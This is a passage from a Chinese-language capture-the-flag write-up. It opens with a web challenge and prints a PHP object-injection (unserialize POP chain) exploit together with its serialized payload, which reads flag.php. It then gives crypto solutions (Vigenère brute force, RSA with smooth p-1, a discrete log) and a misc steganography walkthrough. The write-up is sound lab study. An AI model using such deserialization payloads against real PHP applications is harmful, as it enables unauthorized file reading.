<span class="hljs-variable">$b2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">b1</span>(<span class="hljs-variable">$this</span>-&gt;b2);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b1-&gt;<span class="hljs-title function_ invoke__">blue</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">red</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;r1 . <span class="hljs-string">&#x27;0xff0000&#x27;</span>; <span class="hljs-comment">#toString</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;r1)(); <span class="hljs-comment">#invoke</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;r1-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">white</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">color</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;c1)();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;c1);<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$color1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>();<br><span class="hljs-variable">$white1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">white</span>();<br><span class="hljs-variable">$red1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>();<br><span class="hljs-variable">$blue1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">blue</span>();<br><span class="hljs-variable">$red2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>();<br><span class="hljs-variable">$color2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>();<br><span class="hljs-variable">$color2</span> -&gt; c1 = <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$red1</span> -&gt; r1 = <span class="hljs-variable">$white1</span>;<br><span class="hljs-variable">$white1</span> -&gt; w = <span class="hljs-variable">$color1</span>;<br><span class="hljs-variable">$color1</span> -&gt; c1 = <span class="hljs-variable">$blue1</span>;<br><span class="hljs-variable">$blue1</span> -&gt; b1 = <span class="hljs-variable">$red2</span>;<br><span class="hljs-variable">$red2</span> -&gt; r1 = <span class="hljs-variable">$color2</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$red1</span>);<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;red&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;r1&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;white&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;w&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;color&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;c1&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;b1&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;red&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;r1&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;color&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;c1&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;&#125;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;b2&quot;</span>;N;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.katck.com/images/2023/01/15/aad6bb29408cba2dcaf5b7dd81fdeaab.png" alt="aad6bb29408cba2dcaf5b7dd81fdeaab.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="daobudao"><a href="#daobudao" class="headerlink" title="daobudao"></a>daobudao</h3><p>base64之后凯撒</p><h3 id="brute-vigenere"><a href="#brute-vigenere" class="headerlink" title="brute_vigenere"></a>brute_vigenere</h3><p>题目明示爆破就完事了，维吉尼亚密码表中多加了个<code>&#123;&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br> <br>dicts = string.ascii_lowercase + <span class="hljs-string">&quot;&#123;&#125;&quot;</span><br>enc = <span class="hljs-string">&#x27;&#123;mvjk&#125;gbxyiutfchpm&#125;ylm&#125;a&#125;amuxlmg&#x27;</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span>  itertools.product(dicts, repeat=<span class="hljs-number">4</span>):<br>    key = <span class="hljs-string">&#x27;&#x27;</span>.join(k)<br>    enc_index = [dicts.index(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc]<br>    key_index = [dicts.index(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key]<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>        ans = (enc_index[i] - key_index[i % <span class="hljs-number">4</span>]) % <span class="hljs-number">28</span><br>        flag += dicts[ans]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hsnctf&#123;&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output:hsnctf&#123;wecanalwaystrustvigenere&#125;</span><br></code></pre></td></tr></table></figure><h3 id="smooth-rsa"><a href="#smooth-rsa" class="headerlink" title="smooth_rsa"></a>smooth_rsa</h3><p>通过gen_primes()和genkey()生成素数和公钥。</p><p>有趣的是flag被分成两部分，第二部分使用$e^{m_2}\ mod\ n$加密</p><p><img src="https://img.katck.com/images/2023/01/15/a5373fc4c2f59f490da29d1fa720835a.png" alt="a5373fc4c2f59f490da29d1fa720835a.png" style="zoom:67%;" /></p><p>根据素数生成的函数判断，p-1光滑，根据Pollard’s p-1算法分解N。获得前半部分flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Pollards_p_1</span>(<span class="hljs-params">N</span>):<br>    a = <span class="hljs-number">2</span><br>    n = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        a = <span class="hljs-built_in">pow</span>(a, n, N)<br>        res = gmpy2.gcd(a-<span class="hljs-number">1</span>, N)<br>        <span class="hljs-keyword">if</span> res != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> res != N:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>, n)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p =&#x27;</span>, res)<br>            <span class="hljs-keyword">return</span> res<br>        n += <span class="hljs-number">1</span>    <br><br><br>n = <span class="hljs-string">&#x27;&#x27;</span><br>c = <span class="hljs-string">&#x27;&#x27;</span><br>e = <span class="hljs-number">0x10001</span><br>p = Pollards_p_1(n)<br>q = n // p<br>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br>output:<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 519863</span><br><span class="hljs-string">p = 153745976376847545241555912669157347880949716526722039650361779744915868188863264992722345501177873099593695231122873134365290651521444093220273133944427674631580854029267432922015034145356597048170793885604683602766372487332360313195898198870590532683023388212411561733101072884414575984089097280339407299863</span><br><span class="hljs-string">b&#x27;HSNCTF&#123;015f0d60fab48&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>另一半通过有限域内求离散对数获得</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sage: p = 153745976376847545241555912669157347880949716526722039650361779744915868188863264992722345501177873099593695231122873134365290651521444093220273133944427674631580854029267432922015034145356597048170793885604683602766372487332360313195898198870590532683023388212411561733101072884414575984089097280339407299863<br>sage: <span class="hljs-attribute">G</span>=GF(p)<br>sage: <span class="hljs-attribute">g</span>=G(65537)<br>sage: <span class="hljs-attribute">c</span>=889007651662506403203783493267282257215988729179620082971032093479384814992266823808192587257794931781622242482548202684315610166947125782056641835890542545830029903217817561269310184963519900268026434414254409767043528083064767018130469968738966212268513325090645430187706207887862845389628550171196492124556219364186293306935140349363837175430616647997752033400818089096772569695030947505437436792691260570218211502426593061096955991144063055944016658538765609416477033433728682889456364449301289731877176395077152830024245111711011732884071448942050549470148093802410710200714874231484059368826458031775976862475L<br>sage: discrete_log(c,g)<br>567361900135895770360389450735093365969913930365<br><br><span class="hljs-comment">#cac3408d5a83a64010b&#125;</span><br></code></pre></td></tr></table></figure><p>HSNCTF{015f0d60fab48cac3408d5a83a64010b}</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>签到题直接公众号签到获得flag</p><h3 id="外星电波"><a href="#外星电波" class="headerlink" title="外星电波~"></a>外星电波~</h3><p>flag.zip 中发现 flag.rar 中发现 flag.txt</p><p>明显的base64，解码后发现PK开头，保存为download.zip</p><p>download.zip中存在key.txt，但需要密码。</p><p>之前就发现flag.rar有2.36M但是能看到的内容之后flag.txt，大小不一致，怀疑隐藏东西了</p><p>将rar的文件头改成0x74，表示文件块，才可以正确显示文件（改了好几个）</p><p><img src="https://img.katck.com/images/2023/01/15/005964f4538d87cb374d6e1a809ec795.png" alt="005964f4538d87cb374d6e1a809ec795.png" style="zoom:67%;" /></p><p>之后可以在压缩包中查看到ACL和STM两个文件</p><p><img src="https://img.katck.com/images/2023/01/15/8d24add3c1d285a1c83e12d068101492.png" alt="8d24add3c1d285a1c83e12d068101492.png" style="zoom: 50%;" /></p><p>后来发现NTFS隐写也是可以的</p><p><img src="https://img.katck.com/images/2023/01/15/f599e49329e00302da52eeede036020b.png" alt="f599e49329e00302da52eeede036020b.png" style="zoom: 50%;" /></p><p>通过010 editor查看发现STM是一个音频文件，改后缀后打开听了像是卫星信号，结合题目。直接使用RX-SSTV开始听</p><p><img src="https://img.katck.com/images/2023/01/15/6fab5491d5a9758ef38f8cd05eb232eb.png" alt="6fab5491d5a9758ef38f8cd05eb232eb.png" style="zoom:50%;" /></p><p>获得疑似密码的东西，想到之前key.txt需要密码，获得flag</p><p><img src="https://img.katck.com/images/2023/01/15/74cb65ee6ad22186dcde691c70f7dad4.png" alt="74cb65ee6ad22186dcde691c70f7dad4.png" style="zoom:50%;" /></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
